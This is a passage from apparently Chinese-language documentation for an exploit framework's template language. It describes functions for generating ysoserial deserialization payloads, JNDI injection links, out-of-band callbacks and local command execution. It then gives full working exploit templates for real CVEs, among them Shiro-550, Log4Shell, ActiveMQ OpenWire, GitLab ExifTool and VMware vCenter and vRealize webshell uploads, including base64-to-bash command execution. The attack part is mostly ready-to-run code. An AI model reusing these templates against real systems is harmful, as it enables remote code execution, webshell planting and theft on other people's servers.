reverse([3, 1, 4]) == [4, 1, 3]
reverse(reverse([3, 1, 4])) == [3, 1, 4]
```

#### sort(array[, order])

对数组进行升序排序, 通过 `order` 设置升降序

支持 `order` 如下:

- asc
- desc

```expr
sort([3, 1, 4]) == [1, 3, 4]
sort([3, 1, 4], "desc") == [4, 3, 1]
```

#### sortBy(array[, predicate, order])

根据谓词的结果对数组进行排序, 通过 `order` 设置升降序

支持 `order` 如下:

- asc
- desc

```expr
sortBy(users, .Age)
sortBy(users, .Age, "desc")
```

### 随机生成

#### uuid()

生成并返回随机的 UUID 字符串

```expr
uuid() == "1da56636-b65c-4655-b702-116744ae3e03"
```

#### randomInt(min, max)

生成 `min` 和 `max` 之间的随机整数

```expr
randomInt(1, 100) == 42
```

#### randomStr(min[, max])

生成随机字母+数字字符串

```expr
randomStr(8) == "J9jMcdL0"
randomStr(8, 16) == "uhOhPd7EY6oz"
```

#### randomLower(min[, max])

生成随机小写字母字符串

```expr
randomLower(8) == "nuuttgvt"
randomLower(8, 16) == "vgukrecqdzanjb"
```

#### randomUpper(min[, max])

生成随机大写字母字符串

```expr
randomUpper(8) == "NUUTTGVT"
randomUpper(8, 16) == "VGUKRECQDZANJB"
```

### 时间操作

#### now()

返回当前时间, 类型为 `time.Time`

```expr
now().Year() == 2026
```

#### duration(str)

将 `str` 转换为 `time.Duration` 类型值

```expr
duration("1h").Seconds() == 3600
duration("10m").Seconds() == 600
```

#### date(str[, format[, timezone]])

将 `str` 转换为 `time.Time` 类型值

```expr
date("2023-08-14").Year() == 2023
date("2023-08-14 00:00:00", "2006-01-02 15:04:05").Day() == 14
```

### 数据提取

#### get(v, key)

从对象或数组中提取指定键或索引的值

```expr
get([1, 2, 3], 1) == 2
get({"name": "John", "age": 30}, "name") == "John"
```

#### keys(map)

返回对象的所有键

```expr
keys({"name": "John", "age": 30}) == ["name", "age"]
```

#### values(map)

返回对象的所有值

```expr
values({"name": "John", "age": 30}) == ["John", 30]
```

#### findall(regex, str)

在字符串中查找所有匹配正则表达式的子串

```expr
findall(`\d+`, "12abc34") == ["12", "34"]
```

#### submatch(regex, str)

在字符串中查找正则表达式的第一个匹配项及其捕获组

```expr
submatch(`age=(\d+)`, "name=jack, age=18") == ["age=18", "18"]
```

### 类型转换

#### type(v)

返回 `v` 的数据类型

支持类型如下:

- nil
- int
- map
- uint
- bool
- float
- array
- string
- time.Time
- time.Duration

```expr
type(42) == "int"
type("hello") == "string"
type(now()) == "time.Time"
```

#### int(v)

将值 `v` 转换为整数

```expr
int("123") == 123
```

#### float(v)

将值 `v` 转换为浮点数

```expr
float("1.23") == 1.23
```

#### string(v)

将值 `v` 转换为字符串

```expr
string(123) == "123"
```

#### toJSON(v)

将对象转换为 JSON 字符串

```expr
toJSON({"name": "John", "age": 30}) == '{"name":"John","age":30}'
```

#### fromJSON(v)

将 JSON 字符串解析为对象

```expr
fromJSON('{"name": "John", "age": 30}') == {"name": "John", "age": 30}
```

#### toPairs(map)

将对象转换为 [key, value] 对的数组

```expr
toPairs({"name": "John", "age": 30}) == [["name", "John"], ["age", 30]]
```

#### fromPairs(array)

将 [key, value] 对数组转换回对象

```expr
fromPairs([["name", "John"], ["age", 30]]) == {"name": "John", "age": 30}
```

### 压缩归档

#### tar(name1, content1, name2, content2, ...)

生成 tar 归档文件

```expr
tar("test.txt", "hello") == "\x74\x65\x73\x74..."
```

#### zip(name1, content1, name2, content2, ...)

生成 zip 压缩文件

```expr
zip("test.txt", "hello") == "\x50\x4b\x03\x04..."
```

#### gzip(v)

对数据进行 gzip 压缩

```expr
gzip("hello") == "\x1f\x8b\x08\x00..."
```

#### zlib(v)

对数据进行 zlib 压缩

```expr
zlib("hello") == "\x78\x9c\xcb\x48..."
```

#### gunzip(v)

对数据进行 gzip 解压

```expr
gunzip("\x1f\x8b\x08\x00...") == "hello"
```

### 高级工具

#### js(code[, map])

执行 JavaScript 代码, 可通过 `map` 参数传入变量

```expr
js("a + b", {"a": 1, "b": 2}) == 3
```

#### tpl(path, map)

基于 Go 模板引擎渲染文件

```expr
// test.tpl: Hello {{.key}}!
tpl("test.tpl", {"key": "World"}) == "Hello World!"
```

#### yso(gadget, method, arg1, arg2?)

使用 ysoserial 生成 Java 反序列化载荷

支持 `gadget` 如下:

AspectJWeaver, BadAttributeValueExpExceptionToString, BeanShell1, C3P0, C3P0Tomcat, C3P0_LowVer, Click1, Clojure, CommonsBeanutils1, CommonsBeanutils1_183, CommonsBeanutils2, CommonsBeanutils2_183, CommonsBeanutils3, CommonsBeanutils3_183, CommonsCollections1, CommonsCollections10, CommonsCollections11, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6, CommonsCollections6Lite, CommonsCollections7, CommonsCollections8, CommonsCollections9, CommonsCollectionsK1, CommonsCollectionsK2, CommonsCollectionsK3, CommonsCollectionsK4, FastJson, FileUpload1, Groovy1, Hibernate1, Hibernate2, JBossInterceptors1, JSON1, JavassistWeld1, Jdk7u21, Jdk8u20, Jython1, MozillaRhino1, MozillaRhino2, Myfaces1, Myfaces2, ROME, Spring1, Spring2, Spring3, TomcatEL, TomcatGroovy, TomcatMVEL, TomcatSnakeYaml, TomcatXStream, Vaadin1, Wicket1

支持 `method` 如下:

- jar
- run
- cmd
- bcel
- jndi
- class
- upload
- unix或linux
- win或windows
- ...

特别说明: 部分 `gadget` 的 `method` 支持不完整

```expr
yso("CommonsCollectionsK1", "cmd", "calc") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "jar", "http://x.x.x.x/test.jar", "com.example.Calc") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "jndi", "ldap://x.x.x.x:1389/obj") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "class", "/tmp/calc.class") == "\xac\xed\x00\x05..."
yso("CommonsCollectionsK1", "upload", "/tmp/local.txt", "/var/www/remote.txt") == "\xac\xed\x00\x05..."
```

#### jndi(scheme, value)

创建 JNDI 注入链接, 需搭配 Agent 节点使用

支持 `scheme` 如下:

- ldap
- ldaps

支持 `value` 类型如下:

- URL地址
- Java字节码
- Java序列化数据

```expr
jndi("ldap", "http://x.x.x.x/#calc") == "ldap://x.x.x.x/obj"
jndi("ldaps", "\xca\xfe\xba\xbe...") == "ldaps://x.x.x.x/obj"
jndi("ldaps", "\xac\xed\x00\x05...") == "ldaps://x.x.x.x/obj"
```

#### exec(name, arg1[, ...])

执行本地系统命令

```expr
exec("python", "-c", "print('hello')") == "hello"
```

#### read(path)

读取本地文件内容

```expr
read("cache/e10adc3949ba59abbe56e057f20f883e.txt") == "hello"
```

#### write(name, content)

将内容写入本地缓存目录并返回文件路径

```expr
write("test.txt", "hello") == "cache/e10adc3949ba59abbe56e057f20f883e.txt"
```

#### agent(mode, ..., ttl?)

在 Agent 节点上注册相应服务, `ttl` 为可选参数

| 模式    | 函数                                                | 说明            |
| ------- | --------------------------------------------------- | --------------- |
| `dns`   | `agent("dns", domain, type, value, ttl?)`           | 注册 DNS 记录   |
| `ldap`  | `agent("ldap", name, object, ttl?)`                 | 注册 LDAP 条目  |
| `ldaps` | `agent("ldaps", name, object, ttl?)`                | 注册 LDAPS 条目 |
| `http`  | `agent("http", path, status, headers, body, ttl?)`  | 注册 HTTP 接口  |
| `https` | `agent("https", path, status, headers, body, ttl?)` | 注册 HTTPS 接口 |

**dns** 模式:

| 参数     | 说明     | 示例                                                |
| -------- | -------- | --------------------------------------------------- |
| `domain` | 域名     | `"www.test.com"`                                    |
| `type`   | 记录类型 | `"A"`, `"MX"`, `"NS"`, `"TXT"`, `"AAAA"`, `"CNAME"` |
| `value`  | 记录值   | `"127.0.0.1"`, `"::1"`                              |
| `ttl`    | 过期时间 | `"60s"`, `"10m"`, `"1h"`                            |

**ldap / ldaps** 模式:

| 参数     | 说明     | 示例                          |
| -------- | -------- | ----------------------------- |
| `name`   | 标识条目 | `"cn=test,dc=example,dc=com"` |
| `object` | 响应对象 | `{"user": "user@mail.com"}`   |
| `ttl`    | 过期时间 | `"60s"`, `"10m"`, `"1h"`      |

**http / https** 模式:

| 参数      | 说明     | 示例                     |
| --------- | -------- | ------------------------ |
| `path`    | 路径     | `"/test"`                |
| `status`  | 状态码   | `200`                    |
| `headers` | 响应头   | `{"Server": "nginx"}`    |
| `body`    | 响应体   | `"hello"`                |
| `ttl`     | 过期时间 | `"60s"`, `"10m"`, `"1h"` |

```expr
agent("dns", "www.test.com", "A", "127.0.0.1", "60s") == "www.test.com"
agent("ldap", "cn=test,dc=example,dc=com", {"user":"user@mail.com"}) == "ldap://x.x.x.x/cn=test,dc=example,dc=com"
agent("http", "/test", 200, {"Server": "nginx"}, "hello") == "http://x.x.x.x/test"
```

#### cache(url)

从缓存中获取数据, 需搭配 `httplog` 使用

```expr
cache("http://x.x.x.x/test") == "GET /test HTTP/1.1 ..."
```

#### sleep(n)

暂停 `n` 秒

```expr
sleep(5) == true
```

#### httplog(mode?)

创建 HTTP 监听链接, 需要接入 Agent 节点

支持 `mode` 如下:

- raw
- header
- body

特别说明: 不设置 `mode` 则默认为 `body` 且无法搭配 `cache`

```expr
httplog() == "http://x.x.x.x/xxx"
httplog("raw") == "http://x.x.x.x/xxx"
```

#### classname(v)

从 Java 字节码中提取类名

```expr
classname("\xca\xfe\xba\xbe...") == "com.example.Main"
```

## 参考示例

### CVE-2016-4437

- 文件路径: `plugin/Shiro/shiro-550-aes-cbc#C.yml`
- 模板类型: Command (C)
- 核心要点: 通过 `exploit.command.Yso()` 生成反序列化载荷, 使用 `toAES()` 和 `base64()` 进行 AES-CBC 加密和编码构造恶意 Cookie, 配合 `uuid()` 生成的随机标识过滤回显, 并用 `Truncate()` 精确截取命令执行结果

```yaml
name: shiro-550-aes-cbc

tags:
    - Shiro550
    - Apache Shiro
    - CVE-2016-4437

vars:
    UUID: uuid()
    IV: randomStr(16)
    Name: exploit.option.arg2
    Value: base64(IV + toAES("CBC", b64dec(exploit.option.arg3), IV, exploit.command.Yso(exploit.option.arg1)))
    Command: format(`%s && echo %s`, exploit.command, UUID)

default:
    arg1: CommonsBeanutils1,CommonsBeanutils2,CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollectionsK1,CommonsCollectionsK2,CommonsBeanutils1_183,CommonsBeanutils2_183
    arg2: rememberMe
    arg3: kPH+bIxk5D2deZiIxcaaaA==
    method: spring,tomcat
    command: whoami

rules:
    r0:
        request:
            method: POST
            headers:
                Cookie: "{{Name}}={{Value}}"
                X-Access-Token: "{{Command}}"
        expr: response.body.Has(UUID)
        print:
            - response.body.Truncate(UUID)
expr: r0()
```

### CVE-2020-1938

- 文件路径: `plugin/Tomcat/tomcat-ajp-include#D.yml`
- 模板类型: Download (D)
- 核心要点: 通过 `exec()` 函数直接调用本地 Python 脚本, 构造并发送复杂的 AJP 数据包以获取执行结果

```yaml
name: tomcat-ajp-include

type: python

tags:
    - GhostCat
    - Tomcat AJP
    - CVE-2020-1938
    - CNVD-2020-10487

vars:
    Output: exec("python", "plugin/Tomcat/CVE-2020-1938.py", "-t", request.url.domain, "-p", request.url.port, "-m", exploit.option.arg1, "-f", exploit.download)

default:
    arg1: eval,read
    arg2: no proxy support
    download: WEB-INF/web.xml

rules:
    r0:
        expr: len(Output) > 0
        print:
            - Output
expr: r0()
```

### CVE-2021-21972

- 文件路径: `plugin/VMware/vmware-vcenter-uploadova#U.yml`
- 模板类型: Upload (U)
- 核心要点: 通过 `js()` 动态构造路径并结合 `tar()` 打包文件, 然后通过 `uploadova` 实现文件上传, 借助 `uuid()` 生成的随机标识验证结果

```yaml
name: vmware-vcenter-uploadova

tags:
    - VMware vCenter
    - CVE-2021-21972

vars:
    UUID: uuid()
    Form: randomStr(16)
    Path: exploit.upload.remote
    IsJSP: hasSuffix(Path, ".jsp") || hasSuffix(Path, ".jspx")
    Archive: |
        if IsJSP == false {
            tar(format("../../../../%s", trimPrefix(Path, "/")), exploit.upload.content)
        } else {
            tar(js("let arr=[],[n,m]=range.split('-').map(Number);arr.push(`../../../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/${shell}`,content);for(let i=n;i<=m;i++)arr.push(`../../../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/${i}/0/h5ngc.war/resources/${shell}`,content);arr", {"range": exploit.option.arg1, "shell": Path, "content": UUID + exploit.upload.content}))
        }

default:
    arg1: 30-50
    remote: example.jsp

rules:
    r0:
        request:
            method: POST
            path: /ui/vropspluginui/rest/services/uploadova
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="uploadFile"; filename="{{UUID}}.tar"
                Content-Type: application/octet-stream

                {{Archive}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.body.Has("SUCCESS") && IsJSP
    r1:
        request:
            method: GET
            path: /statsreport/{{Path}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s`, request.url)"
    r2:
        request:
            method: GET
            path: /ui/resources/{{Path}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s`, request.url)"
expr: r0() && (r1() || r2())
```

### CVE-2021-22205

- 文件路径: `plugin/GitLab/gitlab-exiftool-rce#C.yml`
- 模板类型: Command (C)
- 核心要点: 先提取登录页 CSRF Token, 再通过 `hexdec(format(...))` 动态拼接 `exploit.command.OOB()` 外带命令实现畸形的图片字节流, 然后上传图片触发 ExifTool 漏洞

```yaml
name: gitlab-exiftool-rce

tags:
    - ExifTool
    - CVE-2021-22205

vars:
    UUID: uuid()
    Form: randomStr(16)
    Command: format("echo %s|base64 -d|bash", base64(exploit.command.OOB()))
    Image: hexdec(format("41542654464f524d%08x444a5655494e464f0000000a0000000018002c01160142476a7000000000414e5461%08x286d657461646174610a0928436f7079726967687420225c0a22202e2071787b%x7d202e205c0a22206220222920290a", len(Command) + 0x55, len(Command) + 0x2f, Command))

default:
    method: curl,ping,none,nslookup
    command: whoami

rules:
    r0:
        request:
            method: GET
            path: /users/sign_in
            redirect: true
        expr: response.status == 200 && response.body.Has('csrf-token" content="')
        vars:
            Token: response.body.Submatch(`csrf-token" content="(.+?)" />`)
            Cookie: response.cookie
    r1:
        request:
            method: POST
            path: /uploads/user
            headers:
                Cookie: "{{Cookie}}"
                X-CSRF-Token: "{{Token}}"
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="file"; filename="{{UUID}}.jpg"
                Content-Type: image/jpeg

                {{Image}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.status == 422
expr: r0() && r1()
```

### CVE-2021-44228

- 文件路径: `plugin/VMware/vmware-vcenter-log4j#M.yml`
- 模板类型: MemShell (M)
- 核心要点: 使用 `exploit.memshell.JNDI()` 生成 JNDI 注入链接,  对 Log4j 载荷进行 `bypass()` 混淆, 注入 `X-Forwarded-For` 头触发 Log4j 漏洞, 通过 `exploit.memshell.Print()` 输出执行结果

```yaml
name: vmware-vcenter-log4j

tags:
    - JNDI
    - Log4j
    - VMware vCenter
    - CVE-2021-44228

vars:
    Log4j: bypass("log4j", format("${jndi:%s}", exploit.memshell.JNDI(exploit.option.arg1, exploit.option.arg3)))

default:
    arg1: ldap,ldaps
    arg3: TomcatEL,TomcatGroovy,CommonsBeanutils1,CommonsBeanutils2,CommonsCollectionsK1,CommonsCollectionsK2
    server: Tomcat
    custom: "*.class"

rules:
    r0:
        request:
            method: GET
            path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
            headers:
                X-Forwarded-For: "{{Log4j}}"
        expr: response.status >= 200
        print:
            - exploit.memshell.Print(response.body)
expr: r0()
```

### CVE-2022-1471

- 文件路径: `plugin/Spring/spring-cloud-env-snakeyaml#M.yml`
- 模板类型: MemShell (M)
- 核心要点: 通过 `agent()` 托管 Jar 包与 SnakeYAML 载荷, 将 YAML URL 写入 `spring.cloud.bootstrap.location` 配置, 然后刷新配置触发 SnakeYAML 反序列化漏洞

```yaml
name: spring-cloud-env-snakeyaml

tags:
    - CVE-2022-1471
    - Spring Env SnakeYAML

vars:
    Jar: 'agent(exploit.option.arg1, "/" + uuid() + ".jar", 200, {}, exploit.memshell.custom != "" ? read(exploit.memshell.custom) : exploit.memshell.Msp("ScriptEngineJar"))'
    Yaml: agent(exploit.option.arg1, "/" + uuid() + ".yml", 200, {}, format('!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL ["%s"]\n  ]]\n]', Jar))

default:
    arg1: http,https
    server: Jetty,Tomcat,SpringWebMvc
    custom: "*.jar"

rules:
    r0:
        request:
            method: POST
            path: /env
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: spring.cloud.bootstrap.location={{Yaml}}
        expr: response.status == 200 && response.header.Has("application/json") && response.body.Has("spring.cloud.bootstrap.location")
    r1:
        request:
            method: POST
            path: /refresh
            headers:
                Content-Type: application/x-www-form-urlencoded
        expr: response.status == 200 && response.header.Has("application/json")
        print:
            - exploit.memshell
expr: r0() && r1()
```

### CVE-2023-46604

- 文件路径: `plugin/ActiveMQ/activemq-openwire-61616#C.yml`
- 模板类型: Command (C)
- 核心要点: 使用 `replace()` 和 `repeat()` 将命令填充至 Class 固定偏移, 再用 `yso()` 生成反序列化载荷, 然后通过 `format()` 和 `hexdec()` 拼装 OpenWire 协议数据包, 最后发送数据包并从响应中截取执行结果

```yaml
name: activemq-openwire-61616

type: tcp

tags:
    - OpenWire
    - CVE-2023-46604
    - Apache ActiveMQ

vars:
    Class: b64dec("yv66vgAAADEAqwoALwBMBwBNCABOCABPCQAuAFAKAAIAUQgAUgoAUwBUCgACAFUIAFYKAAIAVwgAWAgAWQcAWgoADgBbCgAOAFwKAF0AXgcAXwoAEgBMCgBgAGEKABIAYgcAYwoAFgBkCwBlAGYLAGUAZwsAZQBoCABpCwBlAGoKABIAawoAAgBsCABtCgBuAG8IAEIKAG4AcAoAcQByCgBzAHQKAHEAdQcAdggAdwgARgcAeAoAKQB5CgB6AGgHAHsIAHwHAH0HAH4BAAdDb250...")
    Object: base64(yso(exploit.option.arg1, "", "class_base64:" + base64(replace(Class, repeat("A", 4096), exploit.command.command + repeat(" ", 4096 - len(exploit.command.command))))))
    Message: format("[main]\nbs = org.apache.activemq.util.ByteSequence\nbs.data = %s\nbs.offset = 0\nbs.length = %d\nmessage = org.apache.activemq.command.ActiveMQObjectMessage\nmessage.content = $bs\nmessage.trustAllPackages = true\nmessage.object.x = x\n", Object, len(Object))
    OpenWire: hexdec(format("%08x1f0000000000000000000101002c6f72672e6170616368652e6163746976656d712e736869726f2e656e762e496e69456e7669726f6e6d656e7401%04x%x", len(Message) + 61, len(Message), Message))

default:
    arg1: CommonsBeanutils1,CommonsBeanutils2
    command: cat conf/jetty-realm.properties

rules:
    r0:
        request:
            body: "-"
        expr: response.body.Has("ActiveMQ")
    r1:
        request:
            body: "{{OpenWire}}"
        expr: len(response.body) > 13 && response.body.HasPrefix(hexdec("000000000e011700022e2e"))
        print:
            - string(response.body)[13:]
expr: r0() && r1()
```

### CVE-2021-21975 + CVE-2021-21983

- 文件路径: `plugin/VMware/vmware-vrealize-operations-ssrf&upload#U.yml`
- 模板类型: Upload (U)
- 核心要点: 利用 SSRF 向 `httplog()` 发送认证请求, 通过 `sleep()` + `cache()` 提取 Token, 再凭借 Token 和文件上传接口实现路径穿越写入 Shell

```yaml
name: vmware-vrealize-operations-ssrf&upload

tags:
    - vROps
    - CVE-2021-21975
    - CVE-2021-21983
    - VMware vRealize Operations

vars:
    UUID: uuid()
    Form: randomStr(16)
    Path: exploit.upload.remote
    Shell: exploit.upload.content
    Accept: trimPrefix(httplog("header"), "http://")

default: example.jsp

rules:
    r0:
        request:
            method: POST
            path: /casa/nodes/thumbprints
            headers:
                Content-Type: application/json
            body: '["{{Accept}}"]'
        expr: response.status == 200 && response.body.Has(Accept)
        vars:
            Token: 'sleep(3); trim(submatch("(?i)Authorization: Basic (.+)", cache("http://" + Accept))[1])'
        print:
            - 'format("Authorization: Basic %s", Token)'
    r1:
        request:
            method: POST
            path: /casa/private/config/slice/ha/certificate
            headers:
                Authorization: Basic {{Token}}
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{Form}}
            body: |
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="name"

                ../../../../../usr/lib/vmware-casa/casa-webapp/webapps/casa/{{Path}}
                ------WebKitFormBoundary{{Form}}
                Content-Disposition: form-data; name="file"; filename="{{UUID}}"
                Content-Type: text/plain

                <!--{{UUID}}-->{{Shell}}
                ------WebKitFormBoundary{{Form}}--
        expr: response.status == 200
    r2:
        request:
            method: GET
            path: /casa/{{Path}}
            headers:
                Authorization: Basic {{Token}}
        expr: response.body.Has(UUID)
        print:
            - "format(`Shell URL: %s\nAuthorization: %s`, request.url, Token)"
expr: r0() && r1() && r2()
```

## 常见错误

**1. invalid filename format**

请严格按照 [文件格式](#文件格式) 编写, 特别注意 `.yml` 后缀

**2. unknown oob method: ???**

OOB 模块只支持 `curl`, `ping`, `nslookup`

**3. agent configured with ip does not support ping**

请确保 Agent 节点是通过域名连接, 通过 IP 连接不支持 `ping` 外带方式

**4. interface conversion: interface {} is ???, not string**

如果确定使用字符串类型, 请通过 `string()` 强制转换
